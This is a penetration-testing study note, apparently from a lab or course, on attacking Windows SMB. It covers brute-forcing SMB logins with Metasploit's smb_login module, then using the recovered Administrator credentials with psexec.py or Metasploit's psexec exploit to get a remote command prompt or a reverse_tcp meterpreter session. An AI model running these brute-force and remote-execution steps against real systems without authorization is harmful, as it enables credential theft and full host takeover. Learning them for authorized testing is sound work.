# Exploiting SMB with PsExec

## Contents
- [Methodology](#methodology)
  - [What is PsExec?](#what-is-psexec)
  - [SMB Exploitation with PsExec](#smb-exploitation-with-psexec)
- [Techniques & Tools](#techniques--tools)
  - [Brute Force with MSF](#brute-force-with-msf)
  - [Access with PsExec](#access-with-psexec)
    - [1. psexec.py](#1-psexecpy)
    - [2. Metasploit](#2-metasploit)

## Methodology

### What is PsExec?
- PsExec is a lightweight telnet-replacement developed by Microsoft that allows you to execute processes on remote Windows systems using any user's credentials.
- PsExec authentication is performed via SMB.
- We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
- It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.

### SMB Exploitation with PsExec
- In order to utilize PsExec to gain access to a Windows target, we need to identifiy legitimate user accounts first, along with their respective passwords or password hashes. 
- This can be done by leveraging various tools and techniques.
- However, the most common technique will involve performing an SMB login brute-force attack.
- We can narrow down our brute-force attack to only include common Windows user accounts like...
  - `Administrator`  (which is constant across all Windows installations)
- After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell. 

## Techniques & Tools

- Start with your standard nmap scan (`-sV -sC`) to see what you have.
- Often it will be SMB2 is running on port 445
- **"_Message signing is enabled but not required_"**: KEY!! This means you can brute-force it.

### Brute Force with MSF
```
msfconsole
> search smb_login
> use [that module]
> info
  # to see what it does
> options
> set RHOSTS [target ip]
> set RPORT
  # if it's not set to 445 already
> set SMBDomain
  # if the target is part of a Domain
> set SMBPass [password]
  # if you know it, to verify it
> set SMBUser [username]
  # if you know it, to verify it
> set USER_File [path to text file of usernames]
  # example: /usr/share/metasploit-framework/data/wordlists/common_users.txt
> set PASS_File [path to text file of passwords]
  # example: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
> set verbose false
  # only display successful authentication attempts
> run
```
- That should give you creds... admin cred is what we want.

### Access with PsExec

#### 1. psexec.py

> This is a Windows executable but we are in Linux, so in Linux you need... psexec.py Python program.
```
psexec.py Administrator@[target ip] [command to execute; e.g., cmd.exe]
# or for access without executing a command
psexec.py Administrator@[target ip]
```
- You'll be prompted for the password
- This should give you a cmd command prompt on the target system: `whoami`

#### 2. Metasploit 
> You can do the same thing in MetaSploit
```
> search psexec
  # We're looking for the module that will authenticate on the target via SMB
  # Then it will upload necessary files to establish a meterpreter session
  # Antivirus programs on the target might catch this b/c you are uploading files and executing them.
> use /exploit/windows/smb/psexec
> show payloads
  # check the default payload (should be okay if its windows/meterpreter/reverse_tcp)
> set RHOSTS, LHOST, LPORT, SMBUser, SMBPass
> run
```
- Should give you a meterpreter session
- 
